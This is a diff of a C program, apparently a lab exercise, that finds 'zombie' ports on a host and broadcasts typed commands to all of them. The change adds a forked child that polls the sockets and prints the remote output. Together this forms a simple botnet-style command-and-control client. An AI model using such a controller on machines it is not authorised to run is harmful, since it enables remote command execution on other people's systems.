@@ -1,6 +1,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <stdbool.h>
+#include <poll.h>
 
 #include "utils_v2.h"
 #include "connection_service.h"
@@ -47,14 +48,6 @@ int* getZombiePorts(int *nb) {
   return portsRunning;
 }
 
-void child(void *socketfd) {
-  int sockfd = *(int*) socketfd;
-
-  char bufRd[BUFFER_SZ];
-  int nbCharRd = sread(sockfd, bufRd, BUFFER_SZ);
-  swrite(1, bufRd, nbCharRd);
-}
-
 int main(int argc, char *argv[]) {
   char* hostname = argv[1];
   if (hostname == NULL) {
@@ -80,37 +73,54 @@ int main(int argc, char *argv[]) {
   }
 
   if (numPortsRunning > 0) {
-    while (1) {
-      printf("\nVeuillez entrer une commande a executer:\n");
+    int childId = sfork();
 
-      char command[BUFFER_SZ];
-      int nbCharRd = sread(0, command, BUFFER_SZ);
+    if (childId != 0) {
+      // PAPA
+      while (1) {
+        char command[BUFFER_SZ];
+        int nbCharRd = sread(0, command, BUFFER_SZ);
+
+        for (int i = 0; i < numPortsRunning; i++) {
+          int port = portsSockets[i][0];
+          int sockfd = portsSockets[i][1];
+
+          printf("\nPort: %d\n\n", port);
+
+          nwrite(sockfd, command, nbCharRd);
+        }
+      }
+    } else {
+      // PA PAPA
+      struct pollfd fds[NUM_PORTS];
+      int timeout = 10;
 
       for (int i = 0; i < numPortsRunning; i++) {
-        int port = portsSockets[i][0];
         int sockfd = portsSockets[i][1];
 
-        printf("\nPort: %d\n", port);
-        printf("Socket fd: %d\n\n", sockfd);
+        fds[i].fd = sockfd;
+        fds[i].events = POLLIN;
+      }
 
-        nwrite(sockfd, command, nbCharRd);
-        printf("Command sent: %s\n", command);
+      while (1) {
+        int ret = spoll(fds, numPortsRunning, timeout);
 
-        printf("Output:\n");
+        if (ret > 0) {
+          for (int i = 0; i < numPortsRunning; i++) {
+            if (fds[i].revents & POLLIN) {
+              char bufRd[BUFFER_SZ];
+              int nbCharRd = sread(fds[i].fd, bufRd, BUFFER_SZ);
 
-        fork_and_run1(child, &sockfd);
-        int status;
-        swait(&status);
-        //while (nbCharRd > 0) {
-         // swrite(1, bufRd, nbCharRd);
-        //  nbCharRd = sread(sockfd, bufRd, BUFFER_SZ);
-        //}
+              swrite(1, bufRd, nbCharRd);
+            }
+          }
+        }
       }
     }
   } else {
     printf("none\n");
   }
-  
+
   // close sockets
   for (int i = 0; i < numPortsRunning; i++) {
     sclose(portsSockets[i][1]);
